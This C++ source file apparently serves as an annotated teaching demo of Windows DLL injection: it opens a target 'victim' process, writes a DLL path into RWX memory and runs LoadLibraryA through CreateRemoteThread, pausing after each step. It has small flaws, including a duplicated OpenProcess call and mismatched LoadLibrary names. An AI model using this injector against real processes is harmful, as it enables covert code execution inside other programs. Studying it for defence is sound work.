#include <Windows.h>
#include <iostream>

int main(int argc, char* argv[]) {
	int pid = atoi(argv[1]);
	HANDLE pHandle = NULL;
	PVOID rBuffer = NULL;

	char* dllPath = argv[2];
	size_t szDll = strlen(dllPath);

	// Once we have PID of our victim process, we need to open a handle to it. 
	//We do it by passing just obtained PID to OpenProcess call.
	printf("Getting handle to PID: %i\n", pid);

	//HANDLE OpenProcess(
	//	[in] DWORD dwDesiredAccess,
	//	[in] BOOL  bInheritHandle,
	//	[in] DWORD dwProcessId
	//);
	// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	pHandle = OpenProcess(
		PROCESS_ALL_ACCESS, // All possible access rights for a process object. -> https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
		FALSE,				// If this value is TRUE, processes created by this process will inherit the handle. Otherwise, the processes do not inherit this handle.
		DWORD(pid));		// The identifier of the local process to be opened.
	pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
	printf("Handle is: %p\n", pHandle);
	system("pause");

	printf("Allocating memory in PID: %i\n", pid);

	//LPVOID VirtualAllocEx(
	//	[in]           HANDLE hProcess,
	//	[in, optional] LPVOID lpAddress,
	//	[in]           SIZE_T dwSize,
	//	[in]           DWORD  flAllocationType,
	//	[in]           DWORD  flProtect
	//);
	// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
	rBuffer = VirtualAllocEx(
		pHandle,					// The handle to a process.
		NULL,						// If lpAddress is NULL, the function determines where to allocate the region
		szDll,						// The size of the region of memory to allocate, in bytes.
		MEM_COMMIT | MEM_RESERVE,	// To reserve and commit pages in one step, call VirtualAllocEx with MEM_COMMIT | MEM_RESERVE.
		PAGE_EXECUTE_READWRITE);	// When allocating dynamic memory for an enclave, the flProtect parameter must be PAGE_READWRITE or PAGE_EXECUTE_READWRITE.
	printf("rBuffer address: %p\n", rBuffer);
	system("pause");

	printf("Writing DLL into process memory of PID: %i\n", pid);
	//BOOL WriteProcessMemory(
	//	[in]  HANDLE  hProcess,
	//	[in]  LPVOID  lpBaseAddress,
	//	[in]  LPCVOID lpBuffer,
	//	[in]  SIZE_T  nSize,
	//	[out] SIZE_T * lpNumberOfBytesWritten
	//);
	WriteProcessMemory(
		pHandle,		// A handle to the process memory to be modified.
		rBuffer,		// A pointer to the base address in the specified process to which data is written.
		dllPath,		// A pointer to the buffer that contains data to be written in the address space of the specified process.
		szDll,			// The number of bytes to be written to the specified process.
		NULL);			// A pointer to a variable that receives the number of bytes transferred into the specified process.
	system("pause");

	printf("Getting address of LoadLibraryW\n");

	//HMODULE GetModuleHandleA(
	//	[in, optional] LPCSTR lpModuleName
	//);
	// https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea
	HMODULE hModule = GetModuleHandle(L"kernel32.dll");

	//FARPROC GetProcAddress(
	//	[in] HMODULE hModule,
	//	[in] LPCSTR  lpProcName
	//);
	// https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
	LPVOID lpStartAddress = GetProcAddress(hModule, "LoadLibraryA");

	//HANDLE CreateRemoteThread(
	//	[in]  HANDLE                 hProcess,
	//	[in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	//	[in]  SIZE_T                 dwStackSize,
	//	[in]  LPTHREAD_START_ROUTINE lpStartAddress,
	//	[in]  LPVOID                 lpParameter,
	//	[in]  DWORD                  dwCreationFlags,
	//	[out] LPDWORD                lpThreadId
	//);
	// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
	HANDLE hThread = CreateRemoteThread(
		pHandle,								// A handle to the process in which the thread is to be created.
		NULL,									// *SECURITY ATTRIBUTES If lpThreadAttributes is NULL, the thread gets a default security descriptor and the handle cannot be inherited
		0,										// The initial size of the stack, in bytes.
		(LPTHREAD_START_ROUTINE)lpStartAddress,	// A pointer to the application-defined function of type LPTHREAD_START_ROUTINE to be executed
		rBuffer,								// A pointer to a variable to be passed to the thread function.
		0,										// 	The thread runs immediately after creation.
		NULL);									// If this parameter is NULL, the thread identifier is not returned.
	printf("Remote thread %p created in PID : %i\n", hThread, pid);

	system("pause");

	printf("Closing handle to PID : % i\n", pid);

	//BOOL CloseHandle(
	//	[in] HANDLE hObject
	//);
	// https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
	CloseHandle(pHandle); // A valid handle to an open object.

	return 0;
}